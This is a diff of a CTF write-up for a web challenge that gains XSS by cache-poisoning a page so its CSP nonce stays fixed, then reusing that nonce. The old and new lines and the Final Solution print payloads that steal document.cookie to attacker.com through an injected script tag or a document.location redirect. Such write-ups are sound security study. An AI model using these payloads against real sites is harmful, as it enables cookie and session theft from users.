@@ -92,18 +92,18 @@ So we tried to forge an URL that ends with .css but still loads index.php. After
 
 SUCCESS! The nonce token was always the same and the response had all the caching headers!
 
-Trying out the following we get XSS with an alert ( nonce being the CSP nonce token that was in a previous response header):
-`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script nonce="nonce">alert(1)</script>`
+Trying out the following we get XSS with an alert ( \{nonce\} being the CSP nonce token that was in a previous response header):
+`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script nonce="\{nonce\}">alert(1)</script>`
 
 However trying to send the cookie to our server via ajax or as img src didn't work due to the CSP again. So we used the same trick again and wrote a script tag with the correct nonce:
-`document.write('<script nonce="nonce" src="https://attacker.com/cookie='+document.cookie+'"></script>');`
+`document.write('<script nonce="\{nonce\}" src="https://attacker.com/cookie='+document.cookie+'"></script>');`
 
 In hindsight, a document.location=https://attacker.com/cookie='+document.cookie+' would have worked too.
 
 ## Final Solution
-`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script nonce="nonce">document.write('<script nonce="nonce" src="https://attacker.com/cookie='+document.cookie+'"></script>');</script>`
+`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script nonce="\{nonce\}">document.write('<script nonce="\{nonce\}" src="https://attacker.com/cookie='+document.cookie+'"></script>');</script>`
 
-nonce being the CSP nonce token that was in a previous response header with the same URL
+\{nonce\} being the CSP nonce token that was in a previous response header with the same URL
 
 ## Lessons learned
 Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As `default-src` was set to `none`. 
